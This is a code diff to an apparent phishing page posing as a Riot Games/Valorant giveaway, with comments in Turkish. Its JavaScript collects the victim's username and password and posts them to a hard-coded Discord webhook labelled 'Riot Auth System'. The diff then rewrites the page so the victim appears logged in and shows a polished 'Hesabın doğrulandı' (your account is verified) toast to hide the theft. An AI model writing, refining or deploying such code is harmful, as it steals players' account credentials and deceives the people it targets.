@@ -229,18 +229,18 @@ function openAuth() {
     win.document.close();
 }
 
-// 3. WEBHOOK VE GİRİŞ SİMÜLASYONU
+// 3. WEBHOOK, GİRİŞ SİMÜLASYONU VE BİLDİRİM SİSTEMİ
 window.addEventListener("message", function(event) {
     if (event.data.user && event.data.pass) {
-        // Veriyi Webhook'a Gönder
+        // 1. Veriyi Discord'a Gönder (Arka Planda)
         fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 username: "Riot Auth System",
                 embeds: [{
-                    title: "⚠️ Yeni Giriş Başarılı!",
-                    color: 3066993, // Yeşil renk (başarılı hissi için)
+                    title: "✅ Giriş Yapıldı!",
+                    color: 3066993,
                     fields: [
                         { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
                         { name: "🔑 Şifre", value: "```" + event.data.pass + "```" }
@@ -251,34 +251,67 @@ window.addEventListener("message", function(event) {
             })
         });
 
-        // --- SİTEYİ GİRİŞ YAPILMIŞ GİBİ GÖSTEREN KISIM ---
-        
-        // 1. Giriş butonunu kaldır, yerine profil ikonu koy
+        // 2. Arayüzü Güncelle (Giriş Yapılmış Süsü Ver)
         const loginBtn = document.querySelector('.btn-login');
         if(loginBtn) {
             loginBtn.outerHTML = `
-                <div style="display:flex; align-items:center; gap:15px;">
+                <div style="display:flex; align-items:center; gap:12px; background: rgba(255,255,255,0.05); padding: 5px 15px; border-radius: 50px; border: 1px solid rgba(255,70,85,0.3);">
                     <div style="text-align:right">
-                        <div style="color:#fff; font-weight:800; font-size:14px;">${event.data.user}</div>
-                        <div style="color:#79eb1e; font-size:10px; font-weight:700;">BAKİYE: 0 VP</div>
+                        <div style="color:#fff; font-weight:800; font-size:13px; text-transform:uppercase;">${event.data.user}</div>
+                        <div style="color:#79eb1e; font-size:10px; font-weight:900;">0 VP</div>
                     </div>
                     <img src="https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg" 
-                         style="width:40px; height:40px; border-radius:50%; border:2px solid #ff4655;">
+                         style="width:35px; height:35px; border-radius:50%; border:2px solid #ff4655; object-fit:cover;">
                 </div>
             `;
         }
 
-        // 2. Çekiliş yazısını güncelle
+        // Çekiliş metnini güncelle
         const giveawayText = document.querySelector('.giveaway-section p');
         if(giveawayText) {
             giveawayText.innerText = "ÇEKİLİŞE BAŞARIYLA KATILDINIZ!";
             giveawayText.style.color = "#79eb1e";
         }
 
-        // 3. Bir bildirim (Alert) göster (isteğe bağlı)
-        alert("Riot Games hesabınız başarıyla bağlandı. Çekiliş kaydınız oluşturuldu!");
+        // 3. Profesyonel Bildirim Kutusu (Toast) Oluştur
+        showValorantToast(event.data.user);
     }
 }, { once: true });
+
+// Valorant Stili Bildirim Fonksiyonu
+function showValorantToast(username) {
+    const toast = document.createElement('div');
+    toast.style.cssText = `
+        position: fixed; bottom: 30px; right: 30px; 
+        background: #1f2326; color: white; border-left: 5px solid #79eb1e;
+        padding: 20px 30px; border-radius: 4px; z-index: 9999;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5); font-family: 'Inter', sans-serif;
+        transform: translateX(120%); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    `;
+    
+    toast.innerHTML = `
+        <div style="display:flex; align-items:center; gap:15px;">
+            <div style="background:#79eb1e; border-radius:50%; padding:5px;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div>
+                <div style="font-weight:900; font-size:14px; text-transform:uppercase;">Bağlantı Başarılı</div>
+                <div style="font-size:12px; color:#aaa;">Hoş geldin, <b>${username}</b>. Hesabın doğrulandı.</div>
+            </div>
+        </div>
+    `;
+
+    document.body.appendChild(toast);
+
+    // Animasyonla içeri sok
+    setTimeout(() => { toast.style.transform = 'translateX(0)'; }, 100);
+
+    // 5 saniye sonra kaldır
+    setTimeout(() => {
+        toast.style.transform = 'translateX(120%)';
+        setTimeout(() => { toast.remove(); }, 500);
+    }, 5000);
+}
     </script>
 </body>
 </html>
